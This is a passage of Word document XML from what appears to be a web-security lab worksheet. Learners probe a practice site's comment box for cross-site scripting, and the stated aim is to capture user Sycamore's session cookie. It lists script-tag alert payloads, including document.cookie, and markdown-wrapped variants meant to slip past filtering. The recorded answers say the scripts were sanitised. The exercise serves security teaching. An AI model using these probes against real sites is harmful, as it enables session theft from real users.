      <w:r w:rsidR="005848E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">of each topic </w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>give</w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> you access to posting comments. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C2F3FF" w14:textId="77777777" w:rsidR="003B42FF" w:rsidRPr="00FA4E5F" w:rsidRDefault="003B42FF" w:rsidP="003B42FF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="644"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09173038" w14:textId="77777777" w:rsidR="00DD5C7B" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="28874DFF">
          <v:shape id="_x0000_i1040" type="#_x0000_t75" style="width:340pt;height:183.1pt;visibility:visible">
            <v:imagedata r:id="rId23" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A178C2" w14:textId="77777777" w:rsidR="00683F22" w:rsidRPr="00FA4E5F" w:rsidRDefault="005848E4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Which post has been </w:t>
      </w:r>
      <w:r w:rsidR="00683F22" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>viewed by Sycamore</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (in 2014)</w:t>
      </w:r>
      <w:r w:rsidR="00683F22" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A28EF5" w14:textId="77777777" w:rsidR="00C56EEE" w:rsidRPr="003B42FF" w:rsidRDefault="00C56EEE" w:rsidP="00C56EEE">
      <w:pPr>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B42FF">
        <w:rPr>
          <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>New Feature: REST API - Documents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515316BC" w14:textId="77777777" w:rsidR="00683F22" w:rsidRPr="00FA4E5F" w:rsidRDefault="00683F22" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Go There. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>We want to get Sycamore's session ID (in a cookie).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9BF9F1" w14:textId="77777777" w:rsidR="00267B2E" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="69C806DA">
          <v:shape id="_x0000_i1041" type="#_x0000_t75" style="width:414.95pt;height:187.3pt">
            <v:imagedata r:id="rId24" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D095FA" w14:textId="77777777" w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">We are now about to attempt XSS operations. </w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Try inserting some script</w:t>
      </w:r>
      <w:r w:rsidR="005848E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> into the comment box (and </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">click </w:t>
      </w:r>
      <w:r w:rsidR="005848E4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>submit)</w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42166260" w14:textId="77777777" w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F" w:rsidRDefault="00A83DA2" w:rsidP="00E75062">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;script&gt;alert("XSS");&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC8CC72" w14:textId="77777777" w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F" w:rsidRDefault="00A83DA2" w:rsidP="00E75062">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="385623"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05582DE0" w14:textId="77777777" w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F" w:rsidRDefault="00A83DA2" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Are these scripts executed, sanitised or filtered?</w:t>
      </w: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8"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w14:paraId="35D95944" w14:textId="77777777" w:rsidTr="00FA4E5F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8522" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="22E4929D" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00FA4E5F">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FA4E5F">
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="FF0000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">They are sanitised. They are displayed and do not run. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E426370" w14:textId="77777777" w:rsidR="00625BDB" w:rsidRPr="00FA4E5F" w:rsidRDefault="0051736E" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Checking the comments form</w:t>
      </w:r>
      <w:r w:rsidR="00C56EEE" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> carefully. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EDA272" w14:textId="77777777" w:rsidR="001279DD" w:rsidRPr="00FA4E5F" w:rsidRDefault="008F2E27" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Just follow along the following tries</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> of XSS operations</w:t>
      </w:r>
      <w:r w:rsidR="001279DD" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="833C0B"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7DB279" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="70579A0C">
          <v:rect id="_x0000_s2097" style="position:absolute;left:0;text-align:left;margin-left:24.3pt;margin-top:48.6pt;width:390.75pt;height:63.75pt;z-index:2">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="4A993F91" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="0051736E" w:rsidRDefault="004A7D32" w:rsidP="0051736E">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="004A7D32">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>*bold* _italics_</w:t>
                  </w:r>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t xml:space="preserve">, </w:t>
                  </w:r>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:br/>
                  </w:r>
                  <w:r w:rsidR="0051736E" w:rsidRPr="0051736E">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>Links can be added with [Link title](http://example.com)</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="7428678D" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00CA4DA6" w:rsidRDefault="0051736E" w:rsidP="0051736E">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">What </w:t>
      </w:r>
      <w:r w:rsidR="00083F78" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> the accepted format</w:t>
      </w:r>
      <w:r w:rsidR="004A7D32" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> for inserting </w:t>
      </w:r>
      <w:r w:rsidR="004A7D32" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">bold, italics and </w:t>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>links</w:t>
      </w:r>
      <w:r w:rsidR="008F2E27" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> for in the comment box</w:t>
      </w:r>
      <w:r w:rsidR="0051736E" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4734BB9A" w14:textId="77777777" w:rsidR="0051736E" w:rsidRPr="00FA4E5F" w:rsidRDefault="0051736E" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D0DCF26" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Try inserting this script:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;script&gt;alert('xss');&lt;/script&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>into a comment as bold; i.e.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00083F78" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:t>*&lt;script&gt;alert('xss');&lt;/script&gt;*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D0B43B" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="6BBDB891">
          <v:rect id="_x0000_s2100" style="position:absolute;left:0;text-align:left;margin-left:21.75pt;margin-top:32.05pt;width:390.75pt;height:47.1pt;z-index:4">
            <v:textbox>
              <w:txbxContent>
                <w:p w14:paraId="68BCBCE0" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="0051736E" w:rsidRDefault="001279DD" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:pStyle w:val="ListParagraph"/>
                    <w:ind w:left="284"/>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t xml:space="preserve">The script does not work but appear as comments </w:t>
                  </w:r>
                  <w:r w:rsidR="004A7D32">
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS" w:cs="Times New Roman"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                      <w:sz w:val="24"/>
                      <w:szCs w:val="24"/>
                      <w:lang w:val="en-AU"/>
                    </w:rPr>
                    <w:t>in bold</w:t>
                  </w:r>
                </w:p>
                <w:p w14:paraId="2BA6D5DC" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00CA4DA6" w:rsidRDefault="004A7D32" w:rsidP="004A7D32">
                  <w:pPr>
                    <w:rPr>
                      <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                      <w:i/>
                      <w:color w:val="FF0000"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:txbxContent>
            </v:textbox>
            <w10:wrap type="square"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="004A7D32" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Does it work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529F0397" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="425"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39598EA0" w14:textId="77777777" w:rsidR="004A7D32" w:rsidRPr="00FA4E5F" w:rsidRDefault="004A7D32" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Try inserting this script: &lt;script&gt;alert('xss');&lt;/script&gt; into a comment as</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> italic; i.e. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
